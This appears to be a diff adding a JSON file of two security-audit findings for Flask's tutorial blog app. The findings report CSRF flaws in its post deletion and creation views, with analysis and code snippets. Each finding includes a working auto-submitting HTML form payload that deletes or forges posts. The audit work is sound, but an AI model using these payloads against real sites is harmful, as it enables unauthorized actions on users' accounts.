@@ -1,0 +1,32 @@
+[
+  {
+    "finding_id": "0dbed259-f9b0-58e0-8e9c-357065e32316",
+    "session_id": "ChAxYzdmYTBlOWViYmMzM2E1EAgaATAqBG1haW4",
+    "title": "Cross-Site Request Forgery (CSRF) in Post Deletion Endpoint",
+    "file_path": "/home/jfplante_google_com/repos/p01-flask/examples/tutorial/flaskr/blog.py",
+    "severity": "HIGH",
+    "confidence": 95,
+    "analysis": "The `delete` view in `examples/tutorial/flaskr/blog.py` is vulnerable to Cross-Site Request Forgery (CSRF). \n\n- **Source**: Untrusted HTTP POST request directed to `/\u003cint:id\u003e/delete` initiated by a third-party webpage visited by an authenticated user. The user's session cookie is automatically included with the request by the browser.\n- **Sanitization/Validation**: The `@login_required` decorator checks that `g.user` is present in the session, and `get_post(id)` verifies that the post exists and belongs to `g.user['id']`. However, there is no CSRF token generation, transmission, or validation anywhere in the form submission or endpoint processing, nor is there any check against the `Origin` or `Referer` headers. Furthermore, Flask's default cookie configuration does not enforce `SameSite=Strict` or `SameSite=Lax`.\n- **Sink**: The deletion query `db.execute(\"DELETE FROM post WHERE id = ?\", (id,))` commits the deletion of the victim's post from the database.\n\n**Conceptual Exploit Payload**:\nAn attacker hosts an HTML page containing an auto-submitting form:\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform id=\"csrfForm\" action=\"http://target-flaskr-app:5000/1/delete\" method=\"POST\"\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      document.getElementById('csrfForm').submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\nWhen an authenticated author visits the attacker's page, the browser automatically sends a POST request with the author's session cookie to `/1/delete`, causing post ID 1 to be deleted without the author's knowledge or consent.",
+    "snippet": "@bp.route(\"/\u003cint:id\u003e/delete\", methods=(\"POST\",))\n@login_required\ndef delete(id):\n    \"\"\"Delete a post.\n\n    Ensures that the post exists and that the logged in user is the\n    author of the post.\n    \"\"\"\n    get_post(id)\n    db = get_db()\n    db.execute(\"DELETE FROM post WHERE id = ?\", (id,))\n    db.commit()\n    return redirect(url_for(\"blog.index\"))",
+    "vuln_type": "CWE-352: Cross-Site Request Forgery (CSRF)",
+    "vuln_id": "CWE-352",
+    "status": "OPEN",
+    "start_line": 113,
+    "end_line": 125
+  },
+  {
+    "finding_id": "dc1f9b97-6ecd-5160-89ce-c533b847c92a",
+    "session_id": "ChAxYzdmYTBlOWViYmMzM2E1EAgaATAqBG1haW4",
+    "title": "Cross-Site Request Forgery (CSRF) in Post Creation Endpoint",
+    "file_path": "/home/jfplante_google_com/repos/p01-flask/examples/tutorial/flaskr/blog.py",
+    "severity": "MEDIUM",
+    "confidence": 95,
+    "analysis": "The `create` view in `examples/tutorial/flaskr/blog.py` is vulnerable to Cross-Site Request Forgery (CSRF).\n\n- **Source**: Untrusted HTTP POST request directed to `/create` initiated by an external site visited by an authenticated user. The user's session cookie is automatically included with the request by the browser.\n- **Sanitization/Validation**: The `@login_required` decorator checks that `g.user` is present in the session, and input values for `title` and `body` are read from `request.form`. However, there is no CSRF token check, anti-forgery header check, or Origin/Referer verification.\n- **Sink**: The insert statement `db.execute(\"INSERT INTO post (title, body, author_id) VALUES (?, ?, ?)\", (title, body, g.user[\"id\"]))` executes and commits a new blog post attributed to the victim user.\n\n**Conceptual Exploit Payload**:\nAn attacker hosts an HTML page containing an auto-submitting form:\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform id=\"csrfForm\" action=\"http://target-flaskr-app:5000/create\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"title\" value=\"Compromised Post Title\" /\u003e\n      \u003cinput type=\"hidden\" name=\"body\" value=\"This post was forged via CSRF.\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      document.getElementById('csrfForm').submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\nWhen an authenticated user visits the attacker's page, the browser automatically sends a POST request with the user's session cookie to `/create`, publishing an unauthorized blog post under the victim's name.",
+    "snippet": "@bp.route(\"/create\", methods=(\"GET\", \"POST\"))\n@login_required\ndef create():\n    \"\"\"Create a new post for the current user.\"\"\"\n    if request.method == \"POST\":\n        title = request.form[\"title\"]\n        body = request.form[\"body\"]\n        error = None\n\n        if not title:\n            error = \"Title is required.\"\n\n        if error is not None:\n            flash(error)\n        else:\n            db = get_db()\n            db.execute(\n                \"INSERT INTO post (title, body, author_id) VALUES (?, ?, ?)\",\n                (title, body, g.user[\"id\"]),\n            )\n            db.commit()\n            return redirect(url_for(\"blog.index\"))\n\n    return render_template(\"blog/create.html\")",
+    "vuln_type": "CWE-352: Cross-Site Request Forgery (CSRF)",
+    "vuln_id": "CWE-352",
+    "status": "OPEN",
+    "start_line": 60,
+    "end_line": 83
+  }
+]
